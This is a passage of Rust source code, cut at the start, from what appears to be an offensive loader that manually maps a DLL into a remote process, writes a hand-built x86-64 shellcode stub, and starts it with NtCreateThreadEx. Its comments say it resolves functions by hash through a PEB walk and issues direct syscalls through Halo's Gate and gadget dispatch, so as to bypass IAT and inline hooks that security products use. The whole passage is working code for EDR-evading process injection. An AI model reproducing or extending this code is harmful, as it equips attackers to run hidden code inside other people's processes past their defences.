    //   Use the Toolhelp module map to obtain each DLL's actual remote base,
    //   then read its export table via ReadProcessMemory to find function RVAs.
    //   This ensures every IAT entry holds a valid remote-process address.
    for import in &pe.imports {
        let proc_addr: usize = if let Some(ref rmod) = remote_module_map {
            // Safe path: resolve from the remote process's actual module base.
            let dll_lower = import.dll.to_ascii_lowercase();
            let &remote_dll_base = rmod.get(&dll_lower).ok_or_else(|| {
                anyhow!(
                    "remote_manual_map: import DLL '{}' not found in remote process \
                     module list; cannot resolve '{}'",
                    import.dll,
                    import.name
                )
            })?;
            resolve_remote_export(target_process, remote_dll_base, import.name.as_str())?
        } else {
            // Fast path: resolve locally via PEB walk + clean export table.
            // M-26: avoid hookable GetModuleHandleA / GetProcAddress IAT entries.
            let dll_name_cstr = std::ffi::CString::new(import.dll)
                .map_err(|_| anyhow!("import DLL name contains NUL: {}", import.dll))?;
            let fn_name_cstr = std::ffi::CString::new(import.name.as_str())
                .map_err(|_| anyhow!("import function name contains NUL: {}", import.name))?;

            let dll_hash = pe_resolve::hash_str(dll_name_cstr.to_bytes_with_nul());
            let mod_base = pe_resolve::get_module_handle_by_hash(dll_hash).unwrap_or(0);
            if mod_base == 0 {
                return Err(anyhow!(
                    "PEB-walk failed for '{}': not loaded in current process",
                    import.dll
                ));
            }
            let fn_hash = pe_resolve::hash_str(fn_name_cstr.to_bytes_with_nul());
            let addr = pe_resolve::get_proc_address_by_hash(mod_base, fn_hash).unwrap_or(0);
            if addr == 0 {
                return Err(anyhow!(
                    "PEB-walk export resolution failed for '{}' in '{}'",
                    import.name,
                    import.dll
                ));
            }
            addr
        };

        // Write the resolved function pointer into the remote IAT slot.
        let iat_addr_bytes = (proc_addr as usize).to_le_bytes();
        write_remote(import.rva, &iat_addr_bytes)?;
    }

    // ── Step 4c: flush instruction cache ─────────────────────────────────
    // The CPU may have stale cached instruction bytes from before we wrote
    // the PE image, applied relocations, and fixed the IAT.  Flush the
    // entire mapped region in the target process so the remote thread always
    // executes coherent code.  NtFlushInstructionCache is a no-op on x86/x64
    // (coherency is guaranteed by hardware) but it is the documented pattern
    // for portable correctness and satisfies AV/EDR expectations.
    let _ = nt_syscall::syscall!(
        "NtFlushInstructionCache",
        target_process as u64,
        remote_base as u64,
        image_size as u64,
    );

    // ── Step 5: invoke DllMain via a shellcode stub ───────────────────────
    // DllMain expects (HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved).
    // CreateRemoteThread only passes a single LPVOID parameter, so calling the
    // entry point directly would give DllMain garbage in rcx/rdx/r8.  We write
    // a small position-independent x86-64 stub that:
    //
    //   (a) calls RtlAddFunctionTable to register .pdata if present, then
    //   (b) sets up the correct calling-convention arguments and calls DllMain.
    let entry_rva = opt.standard_fields.address_of_entry_point as usize;
    if entry_rva != 0 {
        let entry_va = remote_base as usize + entry_rva;

        // ── Step 5a: resolve .pdata and RtlAddFunctionTable ──────────────
        // On x86-64, PE images carry a .pdata section with RUNTIME_FUNCTION
        // entries that the OS exception dispatcher needs for unwinding.
        // We prepend a call to RtlAddFunctionTable in the DllMain stub so
        // exceptions/SEH in the injected DLL work correctly in the target.
        //
        // RtlAddFunctionTable is an ntdll *runtime helper*, not an NT syscall.
        // It has no SSN.  We resolve its address from ntdll's export table
        // using the same fast/safe path as IAT resolution, then embed the
        // address as an immediate in the shellcode stub.
        #[cfg(target_arch = "x86_64")]
        let (pdata_va, pdata_count, rtl_add_fn_addr) = {
            let mut pdata_info: Option<(usize, u32, usize)> = None;
            for section in &pe.sections {
                let end = section.name.iter().position(|&b| b == 0).unwrap_or(8);
                if &section.name[..end] == b".pdata" && section.size_of_raw_data > 0 {
                    let va = remote_base as usize + section.virtual_address as usize;
                    let count = (section.size_of_raw_data as usize / 12) as u32;
                    if count > 0 {
                        pdata_info = Some((va, count, 0usize));
                    }
                    break;
                }
            }

            if let Some((va, count, _)) = pdata_info {
                // Resolve RtlAddFunctionTable from ntdll using the same
                // fast/safe logic as IAT resolution.
                let fn_addr: usize = if let Some(ref rmod) = remote_module_map {
                    // Safe path: resolve from the remote process's ntdll.
                    match rmod.get("ntdll.dll") {
                        Some(&remote_ntdll_base) => {
                            match resolve_remote_export(
                                target_process,
                                remote_ntdll_base,
                                "RtlAddFunctionTable",
                            ) {
                                Ok(addr) => addr,
                                Err(e) => {
                                    tracing::warn!(
                                        "remote_manual_map: failed to resolve \
                                         RtlAddFunctionTable from remote ntdll: {e}"
                                    );
                                    0
                                }
                            }
                        }
                        None => {
                            tracing::warn!(
                                "remote_manual_map: ntdll.dll not in remote module map; \
                                 skipping .pdata registration"
                            );
                            0
                        }
                    }
                } else {
                    // Fast path: shared ASLR — resolve locally via PEB walk.
                    let ntdll_hash = pe_resolve::hash_str(b"ntdll.dll\0");
                    let ntdll_base =
                        pe_resolve::get_module_handle_by_hash(ntdll_hash).unwrap_or(0);
                    if ntdll_base == 0 {
                        tracing::warn!(
                            "remote_manual_map: ntdll not found via PEB walk; \
                             skipping .pdata registration"
                        );
                        0
                    } else {
                        let fn_hash = pe_resolve::hash_str(b"RtlAddFunctionTable\0");
                        let addr = pe_resolve::get_proc_address_by_hash(ntdll_base, fn_hash)
                            .unwrap_or(0);
                        if addr == 0 {
                            tracing::warn!(
                                "remote_manual_map: RtlAddFunctionTable not found \
                                 in ntdll; skipping .pdata registration"
                            );
                        }
                        addr
                    }
                };
                (va, count, fn_addr)
            } else {
                (0usize, 0u32, 0usize) // no .pdata
            }
        };

        #[cfg(not(target_arch = "x86_64"))]
        let (pdata_va, pdata_count, rtl_add_fn_addr) = (0usize, 0u32, 0usize);

        // ── Step 5b: build the combined shellcode stub ───────────────────
        // Shellcode (x86-64, position-independent):
        //
        //   ; --- .pdata registration (if present) ---
        //   mov rcx, <pdata_va>          ; PRUNTIME_FUNCTION FunctionTable
        //   mov edx, <entry_count>       ; DWORD EntryCount
        //   mov r8, <remote_base>        ; DWORD64 BaseAddress  (u64, so movabs r8)
        //   mov rax, <RtlAddFunctionTable_addr>
        //   call rax                     ; BOOLEAN result (ignored)
        //
        //   ; --- DllMain invocation ---
        //   mov rcx, <remote_base>       ; HINSTANCE hinstDLL
        //   mov edx, 1                   ; DLL_PROCESS_ATTACH
        //   xor r8d, r8d                 ; lpvReserved = NULL
        //   mov rax, <entry_va>          ; entry point address
        //   call rax
        //   ret
        let mut stub: Vec<u8> = Vec::with_capacity(60);

        #[cfg(target_arch = "x86_64")]
        {
            // Emit .pdata registration prologue only if we have valid data.
            if pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0 {
                // mov rcx, pdata_va          (movabs rcx, imm64)
                stub.extend_from_slice(&[0x48, 0xB9]);
                stub.extend_from_slice(&(pdata_va as u64).to_le_bytes());
                // mov edx, entry_count
                stub.extend_from_slice(&[0xBA]);
                stub.extend_from_slice(&pdata_count.to_le_bytes());
                // mov r8, remote_base        (movabs r8, imm64)
                stub.extend_from_slice(&[0x49, 0xB8]);
                stub.extend_from_slice(&(remote_base as u64).to_le_bytes());
                // mov rax, RtlAddFunctionTable_addr  (movabs rax, imm64)
                stub.extend_from_slice(&[0x48, 0xB8]);
                stub.extend_from_slice(&(rtl_add_fn_addr as u64).to_le_bytes());
                // call rax
                stub.extend_from_slice(&[0xFF, 0xD0]);
            }
        }

        // DllMain invocation (always emitted).
        //   mov rcx, <remote_base>      ; HINSTANCE hinstDLL
        stub.extend_from_slice(&[0x48, 0xB9]);
        stub.extend_from_slice(&(remote_base as u64).to_le_bytes());
        //   mov edx, 1                  ; DLL_PROCESS_ATTACH
        stub.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]);
        //   xor r8d, r8d                ; lpvReserved = NULL
        stub.extend_from_slice(&[0x45, 0x31, 0xC0]);
        //   mov rax, <entry_va>         ; entry point address
        stub.extend_from_slice(&[0x48, 0xB8]);
        stub.extend_from_slice(&(entry_va as u64).to_le_bytes());
        //   call rax
        stub.extend_from_slice(&[0xFF, 0xD0]);
        //   ret
        stub.extend_from_slice(&[0xC3]);

        // Allocate memory for the stub (RW first so we can write it).
        let mut stub_mem: *mut c_void = std::ptr::null_mut();
        let mut stub_alloc_size = stub.len();
        let stub_alloc_status = nt_syscall::syscall!(
            "NtAllocateVirtualMemory",
            target_process as u64,
            &mut stub_mem as *mut _ as u64,
            0u64,
            &mut stub_alloc_size as *mut _ as u64,
            (MEM_COMMIT | MEM_RESERVE) as u64,
            PAGE_READWRITE as u64,
        );
        if stub_alloc_status.map_or(true, |s| s < 0) || stub_mem.is_null() {
            return Err(anyhow!(
                "NtAllocateVirtualMemory for DllMain stub failed: status={:?}",
                stub_alloc_status
            ));
        }

        // Write stub bytes via NtWriteVirtualMemory dispatched through nt_syscall.
        let mut written = 0usize;
        let _ = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            target_process as u64,
            stub_mem as u64,
            stub.as_ptr() as u64,
            stub.len() as u64,
            &mut written as *mut _ as u64,
        );

        // Make the stub executable (RX only — no need for write after writing).
        let mut prot_base = stub_mem;
        let mut prot_size = stub.len();
        let mut old_prot = 0u32;
        let _ = nt_syscall::syscall!(
            "NtProtectVirtualMemory",
            target_process as u64,
            &mut prot_base as *mut _ as u64,
            &mut prot_size as *mut _ as u64,
            PAGE_EXECUTE_READ as u64,
            &mut old_prot as *mut _ as u64,
        );

        // M-27: Use NtCreateThreadEx via nt_syscall::syscall! instead of
        // hookable CreateRemoteThread.  The syscall! macro resolves the SSN
        // through Halo's Gate / clean ntdll mapping and dispatches via a
        // gadget address, bypassing both IAT and inline hooks on the ntdll stub.
        let mut h_thread: *mut winapi::ctypes::c_void = std::ptr::null_mut();
        let status = nt_syscall::syscall!(
            "NtCreateThreadEx",
            &mut h_thread as *mut _ as u64,       // ThreadHandle
            0x1FFFFFu64,                          // THREAD_ALL_ACCESS
            std::ptr::null_mut::<c_void>() as u64, // ObjectAttributes
            target_process as u64,                 // ProcessHandle
            stub_mem as u64,                       // StartRoutine
            std::ptr::null_mut::<c_void>() as u64, // Argument
            0u64,                                  // CreateFlags (run immediately)
            0u64,                                  // ZeroBits
            0u64,                                  // StackSize
            0u64,                                  // MaximumStackSize
            std::ptr::null_mut::<c_void>() as u64, // AttributeList
        );
        if status.map_or(true, |s| s < 0) || h_thread.is_null() {
            return Err(anyhow!(
                "NtCreateThreadEx for DllMain stub failed: {:?}",
                status
            ));
        }
        // Close the thread handle immediately; we don't wait for it.
        pe_resolve::close_handle(h_thread as *mut core::ffi::c_void);
    }

    Ok(remote_base)
}

